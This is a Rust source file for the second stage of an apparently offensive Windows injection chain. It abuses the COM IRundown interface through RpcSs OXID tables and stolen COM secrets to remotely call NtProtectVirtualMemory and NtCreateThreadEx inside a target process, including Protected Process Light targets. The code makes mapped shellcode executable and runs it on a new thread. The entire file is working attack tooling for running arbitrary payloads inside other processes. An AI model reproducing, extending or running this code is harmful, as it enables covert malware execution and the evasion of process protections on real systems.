//! `shellcode.exe` - protects and executes a previously-mapped image.
//!
//! Stage 2 of the chain: takes the base address that `pplsystem.exe` printed,
//! reads the same `--shellcode` PE to recover its `AddressOfEntryPoint` and
//! `SizeOfImage`, then uses the IRundown primitive to remotely call
//! `NtProtectVirtualMemory` (make the whole mapped image RWX) and
//! `NtCreateThreadEx` inside the target.
//!
//! Thread start address:
//!   * default          -> `base + AddressOfEntryPoint` (a plain PIC payload);
//!   * with `--from-base` -> `base` (offset 0). pe2shc-converted shellcode puts a
//!     redirect at the very start of the image (overwriting the DOS header's
//!     first bytes), which jumps to the appended loader stub; that stub fixes
//!     imports/relocations/TLS and only then calls the real entry point. So a
//!     pe2shc payload MUST be started from the base, not the entry point.

use anyhow::{anyhow, bail, Context, Result};
use clap::{Parser, ValueEnum};
use pplsystem_core::{
    irundown::{
        inject::{
            call_ndr_server_call2, increment_and_read, init_remote_com_secret,
            overwrite_data_to_address, set_call_args, write_data_to_address, write_rpc_message,
        },
        locate::{read_secret_and_context_from_dump, read_secret_and_context_remote},
        rpcss::{locate_rpcss_oxid_list_head, CProcess, CServerOXID},
    },
    pe::system_dll_data_section,
};
use std::{fs, mem::size_of, os::raw::c_void};
use sysinfo::System;
use windows::{
    core::{s, GUID, PCSTR},
    Win32::{
        Foundation::{HANDLE, LUID},
        Security::{
            AdjustTokenPrivileges, LookupPrivilegeValueA, LUID_AND_ATTRIBUTES,
            SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES,
        },
        System::{
            Com::{CoInitializeEx, COINIT_MULTITHREADED},
            Diagnostics::Debug::ReadProcessMemory,
            LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA},
            Threading::{GetCurrentProcess, OpenProcess, OpenProcessToken, PROCESS_ALL_ACCESS},
        },
    },
};

#[derive(Copy, Clone, Debug, PartialEq, Eq, ValueEnum)]
enum TargetMode {
    Regedit,
    Ppl,
}

#[derive(Parser, Debug)]
#[command(version, about = "Protect and execute a previously-mapped image via IRundown", long_about = None)]
struct Args {
    /// Target mode.
    #[arg(long, value_enum, default_value_t = TargetMode::Regedit)]
    target: TargetMode,

    /// Path to the same shellcode/PE image that was mapped (to read its entry point and size).
    #[arg(long)]
    shellcode: String,

    /// Base address where the image was mapped (printed by pplsystem.exe).
    #[arg(long)]
    shellcode_base_address: String,

    /// Start the remote thread at the image base (offset 0) instead of
    /// AddressOfEntryPoint. Required for pe2shc-converted shellcode, whose
    /// redirect-to-loader stub lives at the start of the image.
    #[arg(long)]
    from_base: bool,

    /// Target PID. Optional in regedit mode (auto-discovers regedit.exe).
    #[arg(long)]
    pid: Option<u32>,

    /// PPL mode: full-memory user dump to read the COM secret/context from.
    #[arg(long)]
    dump: Option<String>,

    /// COM secret override (hex u128) - bypasses --dump in ppl mode.
    #[arg(long)]
    com_secret: Option<String>,

    /// COM context override (hex u64) - bypasses --dump in ppl mode.
    #[arg(long)]
    com_context: Option<String>,

    /// RpcSs PID. Optional - auto-discovered when omitted.
    #[arg(long)]
    rpcss_pid: Option<u32>,
}

fn parse_hex_u128(s: &str) -> Result<u128, std::num::ParseIntError> {
    let s = s.trim_start_matches("0x").trim_start_matches("0X");
    u128::from_str_radix(s, 16)
}

fn parse_hex_u64(s: &str) -> Result<u64, std::num::ParseIntError> {
    let s = s.trim_start_matches("0x").trim_start_matches("0X");
    u64::from_str_radix(s, 16)
}

fn is_sign_extended_failure_status(value: u64) -> bool {
    (value >> 32) == 0xFFFF_FFFF && ((value as u32) & 0x8000_0000) != 0
}

/// Read `AddressOfEntryPoint` and `SizeOfImage` straight from a PE32+ header.
/// Manual parse (rather than a crate) so the offsets are unambiguous.
fn pe_entry_and_image_size(bytes: &[u8]) -> Result<(u32, u32)> {
    if bytes.len() < 0x40 {
        bail!("file too small to be a PE");
    }
    let e_lfanew = u32::from_le_bytes(bytes[0x3C..0x40].try_into().unwrap()) as usize;
    if bytes.len() < e_lfanew + 0x58 {
        bail!("PE headers truncated");
    }
    if &bytes[e_lfanew..e_lfanew + 4] != b"PE\0\0" {
        bail!("not a valid PE (missing PE signature)");
    }
    let opt = e_lfanew + 0x18; // skip PE sig (4) + COFF file header (20)
    let entry = u32::from_le_bytes(bytes[opt + 0x10..opt + 0x14].try_into().unwrap());
    let size_of_image = u32::from_le_bytes(bytes[opt + 0x38..opt + 0x3C].try_into().unwrap());
    Ok((entry, size_of_image))
}

fn enable_debug_privilege() -> Result<()> {
    unsafe {
        let mut token_handle = HANDLE::default();

        OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES,
            &mut token_handle,
        )
        .context("OpenProcessToken failed")?;

        let mut luid = LUID::default();
        LookupPrivilegeValueA(PCSTR::null(), s!("SeDebugPrivilege"), &mut luid)
            .context("LookupPrivilegeValue(SeDebugPrivilege) failed")?;

        let tp = TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: [LUID_AND_ATTRIBUTES {
                Luid: luid,
                Attributes: SE_PRIVILEGE_ENABLED,
            }],
        };

        AdjustTokenPrivileges(token_handle, false, Some(&tp), 0, None, None)
            .context("AdjustTokenPrivileges(SeDebugPrivilege) failed - run as Administrator")?;

        println!("[+] SeDebugPrivilege enabled");
        Ok(())
    }
}

fn ensure_modules_loaded() {
    for dll in [
        "rpcrt4.dll\0",
        "kernel32.dll\0",
        "ntdll.dll\0",
        "combase.dll\0",
        "user32.dll\0",
        "advapi32.dll\0",
    ] {
        unsafe {
            let _ = LoadLibraryA(PCSTR(dll.as_ptr()));
        }
    }
}

fn find_rpcss_svchost_pid() -> Result<u32> {
    let mut system = System::new_all();
    system.refresh_processes();
    for (pid, process) in system.processes() {
        if process.name().eq_ignore_ascii_case("svchost.exe") {
            let cmdline = process.cmd().join(" ");
            if cmdline.to_ascii_uppercase().contains("RPCSS") {
                return Ok(pid.as_u32());
            }
        }
    }
    Err(anyhow!(
        "could not find the svchost.exe hosting RpcSs (run elevated)"
    ))
}

fn find_process_pid_by_name(name: &str) -> Option<u32> {
    let mut system = System::new_all();
    system.refresh_processes();
    for (pid, process) in system.processes() {
        if process.name().eq_ignore_ascii_case(name) {
            return Some(pid.as_u32());
        }
    }
    None
}

fn resolve_target_pid(args: &Args) -> Result<u32> {
    if let Some(pid) = args.pid {
        if pid == 0 {
            return Err(anyhow!("--pid must be non-zero"));
        }
        return Ok(pid);
    }
    match args.target {
        TargetMode::Regedit => find_process_pid_by_name("regedit.exe")
            .ok_or_else(|| anyhow!("regedit.exe is not running - launch it first or pass --pid")),
        TargetMode::Ppl => Err(anyhow!("--pid is required in ppl mode")),
    }
}

fn resolve_secret_context(args: &Args, target_pid: u32) -> Result<(u128, u64)> {
    match args.target {
        TargetMode::Regedit => read_secret_and_context_remote(target_pid)
            .context("failed reading COM secret/context from the target (regedit mode)"),
        TargetMode::Ppl => {
            if let (Some(s), Some(c)) = (args.com_secret.as_deref(), args.com_context.as_deref()) {
                let secret = parse_hex_u128(s)
                    .map_err(|e| anyhow!("invalid --com-secret (expected hex u128): {e}"))?;
                let context = parse_hex_u64(c)
                    .map_err(|e| anyhow!("invalid --com-context (expected hex u64): {e}"))?;
                Ok((secret, context))
            } else if let Some(dump) = args.dump.as_deref() {
                read_secret_and_context_from_dump(dump)
                    .context("failed reading COM secret/context from the dump (ppl mode)")
            } else {
                Err(anyhow!(
                    "ppl mode requires --dump <user.dmp> (or explicit --com-secret/--com-context)"
                ))
            }
        }
    }
}

fn main() -> Result<()> {
    let args = Args::parse();

    enable_debug_privilege().context("could not enable SeDebugPrivilege")?;
    let _ = unsafe { CoInitializeEx(None, COINIT_MULTITHREADED) };
    ensure_modules_loaded();

    let target_pid = resolve_target_pid(&args)?;
    println!("[+] Target PID: {target_pid}");

    let (com_secret, com_context) = resolve_secret_context(&args, target_pid)?;

    let rpcss_pid = match args.rpcss_pid {
        Some(p) if p != 0 => p,
        _ => find_rpcss_svchost_pid()?,
    };

    let shellcode_base_address = parse_hex_u64(&args.shellcode_base_address)
        .map_err(|e| anyhow!("invalid --shellcode-base-address (expected hex u64): {e}"))?;
    if shellcode_base_address == 0 || (shellcode_base_address & 0xFFF) != 0 {
        bail!("--shellcode-base-address must be a non-zero, page-aligned address");
    }

    let shellcode_bytes = fs::read(&args.shellcode)
        .with_context(|| format!("failed reading shellcode '{}'", args.shellcode))?;
    let (entry_rva, size_of_image) =
        pe_entry_and_image_size(&shellcode_bytes).context("failed parsing shellcode PE headers")?;

    let thread_start = if args.from_base {
        shellcode_base_address
    } else {
        shellcode_base_address + entry_rva as u64
    };
    // Protect only the FIRST PAGE. A SEC_IMAGE maps the PE headers page (base+0,
    // where pe2shc's redirect lives) as PAGE_READONLY - non-executable - while
    // every real section is already mapped PAGE_EXECUTE_WRITECOPY (executable,
    // copy-on-write) because shellcode_editor.py marked them RWX. So only the
    // headers page must be made executable. NtProtect over the *whole* image
    // fails remotely: the range spans two regions (RO headers + WRITECOPY
    // sections) and the call does not complete. One page = one region = succeeds.
    let _ = size_of_image; // (kept for reference / diagnostics)
    let region_to_protect: u64 = 0x1000;

    if args.from_base {
        println!(
            "[+] Image base {:#X}, starting at base (offset 0 / pe2shc redirect) -> thread start {:#X}",
            shellcode_base_address, thread_start
        );
    } else {
        println!(
            "[+] Image base {:#X}, entry RVA {:#X} -> thread start {:#X}",
            shellcode_base_address, entry_rva, thread_start
        );
    }
    println!(
        "[+] Protecting first page ({:#X} bytes) at {:#X} RWX (headers/redirect; sections already executable)",
        region_to_protect, shellcode_base_address
    );

    let rpcss_handle = unsafe {
        OpenProcess(PROCESS_ALL_ACCESS, false, rpcss_pid)
            .with_context(|| format!("OpenProcess(RpcSs pid {rpcss_pid}) failed"))?
    };

    let oxid_list_head = locate_rpcss_oxid_list_head()
        .ok_or_else(|| anyhow!("failed locating the RpcSs OXID list head"))?;

    let mut server_oxid_list_head: u64 = 0;
    unsafe {
        ReadProcessMemory(
            rpcss_handle,
            oxid_list_head.addr as *const c_void,
            &mut server_oxid_list_head as *mut u64 as *mut c_void,
            8,
            None,
        )
        .context("reading gpServerOxidTable head failed")?;
    }

    let mut number_of_oxid_entries: u32 = 0;
    unsafe {
        ReadProcessMemory(
            rpcss_handle,
            server_oxid_list_head as *const c_void,
            &mut number_of_oxid_entries as *mut u32 as *mut c_void,
            4,
            None,
        )
        .context("reading OXID entry count failed")?;
    }

    let mut oxid_array_address: u64 = 0;
    unsafe {
        ReadProcessMemory(
            rpcss_handle,
            (server_oxid_list_head + 8) as *const c_void,
            &mut oxid_array_address as *mut u64 as *mut c_void,
            8,
            None,
        )
        .context("reading OXID array address failed")?;
    }

    let mut oxid_array_data: Vec<u8> = vec![0; (number_of_oxid_entries * 8) as usize];
    unsafe {
        ReadProcessMemory(
            rpcss_handle,
            oxid_array_address as *const c_void,
            oxid_array_data.as_mut_ptr() as *mut c_void,
            (number_of_oxid_entries * 8) as usize,
            None,
        )
        .context("reading OXID array failed")?;
    }

    let (_prefix, oxid_array_data, _suffix) = unsafe { oxid_array_data.align_to::<u64>() };

    let mut target_oxid = 0;
    let mut target_ipid = 0;

    for &oxid_entry_address in oxid_array_data {
        if oxid_entry_address == 0 {
            continue;
        }

        let mut cserver_oxid_entry = CServerOXID {
            padding: [0; 0x18],
            oxid: 0,
            cprocess: 0,
            padding2: [0; 0x38],
            ipid: 0,
        };

        unsafe {
            ReadProcessMemory(
                rpcss_handle,
                oxid_entry_address as *const c_void,
                &mut cserver_oxid_entry as *mut CServerOXID as *mut c_void,
                size_of::<CServerOXID>(),
                None,
            )
            .context("reading CServerOXID entry failed")?;
        }

        let mut cprocess_entry = CProcess {
            pid: 0,
            padding: [0; 88],
        };

        unsafe {
            ReadProcessMemory(
                rpcss_handle,
                cserver_oxid_entry.cprocess as *const c_void,
                &mut cprocess_entry as *mut CProcess as *mut c_void,
                size_of::<CProcess>(),
                None,
            )
            .context("reading CProcess entry failed")?;
        }

        if cprocess_entry.pid == target_pid {
            println!("[+] Found PID  : {:#?}", cprocess_entry.pid);
            println!("[+] Found OXID : {:#X?}", cserver_oxid_entry.oxid);
            println!(
                "[+] Found IPID : {:#X?}",
                GUID::from_u128(u128::from_be(cserver_oxid_entry.ipid))
            );

            target_ipid = cserver_oxid_entry.ipid;
            target_oxid = cserver_oxid_entry.oxid;

            let result = init_remote_com_secret(target_ipid, target_oxid);
            if result.is_err() && result.0 as u32 == 0x80070057 {
                break;
            }
        }
    }

    if target_ipid == 0 || target_oxid == 0 {
        return Err(anyhow!(
            "failed finding IPID/OXID for IRundown in target pid {target_pid}"
        ));
    }

    println!("[+] Remote COM secret : {:#X}", com_secret);
    println!("[+] Remote COM context: {:#X}", com_context);

    // ---- NtProtectVirtualMemory(whole image -> RWX) -----------------------
    let rpcrt_data = system_dll_data_section("rpcrt4.dll")?;
    let user32_data = system_dll_data_section("user32.dll")?;
    let advapi32_data = system_dll_data_section("advapi32.dll")?;
    let kernel32_data = system_dll_data_section("kernel32.dll")?;
    let ntdll_data = system_dll_data_section("ntdll.dll")?;

    if ((rpcrt_data.virtual_size & 0xFFF) + 0x220) >= 0x1000 {
        return Err(anyhow!(
            "rpcrt4.dll .data section is too small; use another DLL"
        ));
    }

    // Three consecutive 8-byte scratch slots in ntdll!.data for the out/in params.
    let old_protect_address = unsafe {
        GetModuleHandleA(s!("ntdll.dll\0")).unwrap().0 as u64
            + ntdll_data.virtual_address as u64
            + ntdll_data.virtual_size as u64
            + 8
    };
    let base_address = old_protect_address + 8;
    let region_size = base_address + 8;

    let start_address = unsafe { GetModuleHandleA(s!("ADVAPI32.dll\0")).unwrap().0 as u64 }
        + advapi32_data.virtual_address as u64
        + advapi32_data.virtual_size as u64;

    let arguments_address = unsafe {
        GetModuleHandleA(s!("kernel32.dll\0")).unwrap().0 as u64
            + kernel32_data.virtual_address as u64
            + ((kernel32_data.virtual_size + 8 - 1) & 0xFFF8) as u64
    };

    let target_function_protect = unsafe {
        GetProcAddress(
            GetModuleHandleA(s!("ntdll.dll\0")).unwrap(),
            s!("NtProtectVirtualMemory"),
        )
        .unwrap() as u64
    };

    // Stage the BaseAddress and RegionSize values into the scratch slots.
    let base_address_value: [u8; 8] = shellcode_base_address.to_le_bytes();
    write_data_to_address(
        &base_address_value,
        base_address,
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    );

    let region_size_value: [u8; 8] = region_to_protect.to_le_bytes();
    write_data_to_address(
        &region_size_value,
        region_size,
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    );

    let message_addr_protect = write_rpc_message(
        start_address,
        arguments_address,
        target_function_protect,
        target_ipid,
        target_oxid,
        com_context,
        com_secret,
    );

    set_call_args(
        [
            u64::MAX,            // ProcessHandle (current = -1)
            base_address,        // PVOID *BaseAddress
            region_size,         // PSIZE_T RegionSize
            0x40,                // PAGE_EXECUTE_READWRITE
            old_protect_address, // PULONG OldProtect
            0,
            0,
            0,
            0,
            0,
            0,
            0xB,
            0xC,
            0xD,
        ],
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    );

    // Zero the OldProtect slot so the read-back reflects THIS call only.
    overwrite_data_to_address(
        &[0u8; 8],
        old_protect_address,
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    );

    call_ndr_server_call2(
        message_addr_protect,
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    );

    // Read back the OldProtect out-param: non-zero => NtProtectVirtualMemory ran.
    let old_protect = increment_and_read(
        old_protect_address,
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    )
    .wrapping_sub(1);
    println!(
        "[+] NtProtectVirtualMemory OldProtect = {:#X} {}",
        old_protect & 0xFFFF_FFFF,
        if (old_protect & 0xFFFF_FFFF) == 0 {
            "(zero -> protect likely FAILED, e.g. ACG)"
        } else {
            "(ran)"
        }
    );

    if (old_protect & 0xFFFF_FFFF) == 0 || is_sign_extended_failure_status(old_protect) {
        bail!(
            "NtProtectVirtualMemory did not produce a valid OldProtect value ({:#X}); refusing to create a remote thread",
            old_protect
        );
    }

    // Now that [base, base+image) is RWX (readable), verify our image content is
    // actually there: the first qword should be the PE 'MZ' header, and the qword
    // at the entry should be the payload's prologue. If these read back as
    // 0x...80010105 (RPC_E_SERVERFAULT) the memory still faults (degenerate map);
    // if they are zero the region is blank (image not really mapped).
    let base_qword = increment_and_read(
        shellcode_base_address,
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    )
    .wrapping_sub(1);
    let entry_qword = increment_and_read(
        thread_start,
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    )
    .wrapping_sub(1);
    println!(
        "[*] base qword = {:#018X} (MZ low word {:#06X}, expect 0x5A4D)",
        base_qword,
        base_qword & 0xFFFF
    );
    if args.from_base {
        println!(
            "[*] start qword = {:#018X} (expect pe2shc redirect 0x000000E852455A4D = 'MZ',push r10,call)",
            entry_qword
        );
    } else {
        println!(
            "[*] entry qword = {:#018X} (expect payload prologue 0x8148564157DC8B4C)",
            entry_qword
        );
    }
    if (base_qword & 0xFFFF) as u16 != 0x5A4D {
        eprintln!("[!] Image content is NOT at the mapped base after RWX - the remote map is degenerate; the thread has nothing valid to run.");
        if is_sign_extended_failure_status(base_qword) {
            bail!(
                "remote image validation failed at {:#X}: readback returned HRESULT({:#010X}); refusing to create a remote thread",
                shellcode_base_address,
                base_qword as u32
            );
        }
        bail!(
            "remote image validation failed at {:#X}: MZ low word was {:#06X}, expected 0x5A4D; refusing to create a remote thread",
            shellcode_base_address,
            base_qword & 0xFFFF
        );
    } else {
        println!("[+] Image content verified at mapped base.");
    }

    // ---- NtCreateThreadEx at base + entry ---------------------------------
    let thread_handle_address = unsafe {
        GetModuleHandleA(s!("ntdll.dll\0")).unwrap().0 as u64
            + ntdll_data.virtual_address as u64
            + ntdll_data.virtual_size as u64
    };

    let start_address = unsafe { GetModuleHandleA(s!("user32\0")).unwrap().0 as u64 }
        + user32_data.virtual_address as u64
        + user32_data.virtual_size as u64;

    let arguments_address = unsafe {
        GetModuleHandleA(s!("kernel32.dll\0")).unwrap().0 as u64
            + kernel32_data.virtual_address as u64
            + ((kernel32_data.virtual_size + 8 - 1) & 0xFFF8) as u64
    };

    let target_function = unsafe {
        GetProcAddress(
            GetModuleHandleA(s!("ntdll.dll\0")).unwrap(),
            s!("NtCreateThreadEx"),
        )
        .unwrap() as u64
    };

    let message_addr = write_rpc_message(
        start_address,
        arguments_address,
        target_function,
        target_ipid,
        target_oxid,
        com_context,
        com_secret,
    );

    println!("[+] Creating remote thread at {:#X}", thread_start);

    set_call_args(
        [
            thread_handle_address, // OUT PHANDLE ThreadHandle
            0x1FFFFF,              // THREAD_ALL_ACCESS
            0,                     // POBJECT_ATTRIBUTES (NULL)
            u64::MAX,              // ProcessHandle (current = -1)
            thread_start,          // PVOID StartAddress (base + entry)
            0,                     // PVOID Parameter (NULL)
            0,                     // CreateSuspended (FALSE)
            0,                     // ZeroBits
            0,                     // StackSize
            0,                     // MaximumStackSize
            0,                     // AttributeList (NULL)
            0xB,
            0xC,
            0xD,
        ],
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    );

    // Zero the ThreadHandle slot so the read-back reflects THIS call only.
    overwrite_data_to_address(
        &[0u8; 8],
        thread_handle_address,
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    );

    call_ndr_server_call2(
        message_addr,
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    );

    // Read back the ThreadHandle out-param: non-zero => NtCreateThreadEx created
    // a thread. If it's non-zero but the payload still didn't run, the thread was
    // most likely killed on start (e.g. CFG rejecting the manually-mapped entry).
    let thread_handle = increment_and_read(
        thread_handle_address,
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    )
    .wrapping_sub(1);
    if thread_handle == 0 {
        println!("[!] Remote thread handle = 0 -> NtCreateThreadEx FAILED (thread not created)");
    } else if is_sign_extended_failure_status(thread_handle) {
        println!(
            "[!] Remote thread handle readback returned HRESULT({:#010X}) -> NtCreateThreadEx likely FAILED",
            thread_handle as u32
        );
    } else {
        println!(
            "[+] Remote thread handle = {:#X} (thread created)",
            thread_handle
        );
    }

    println!("[+] Done!");
    Ok(())
}
